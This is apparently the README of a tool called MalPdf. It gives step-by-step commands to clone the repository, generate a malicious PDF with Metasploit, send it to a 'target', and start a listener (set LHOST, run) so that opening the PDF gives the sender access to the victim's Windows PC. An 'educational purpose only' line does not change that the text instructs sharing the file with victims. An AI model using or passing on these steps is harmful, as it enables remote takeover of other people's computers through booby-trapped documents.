# MalPdf

This is an easy to setup malicious pdf generator which uses metasploit framework.

##This works only with Linux##

This can exploit only windows
Requirements:
      1Gb data
      1Gb storage space

#This is not for exploiting other's PCs and this is for educational purpose only
First start your command prompt or power shell

Type the command:

$apt install git

$git clone https://github.com/Nicko15/MalPdf.git

$cd MalPdf


Now run the 'setup.sh' file by typing:

$./setup.sh

All the needed packages and frameworks will be downloaded

Now to create malicious pdf and use, run the 'create.sh'file by typing:

$sudo bash create.sh

 You will get a file path and you can shere the file to your target

To listen to the pdf, type:

$sudo bash listen.sh

$set LHOST <your_ip>

$run

Replace <your_ip> with your ip address
Now your pc will start listening. As soon as your target opens the pdf, you will get access over his pc
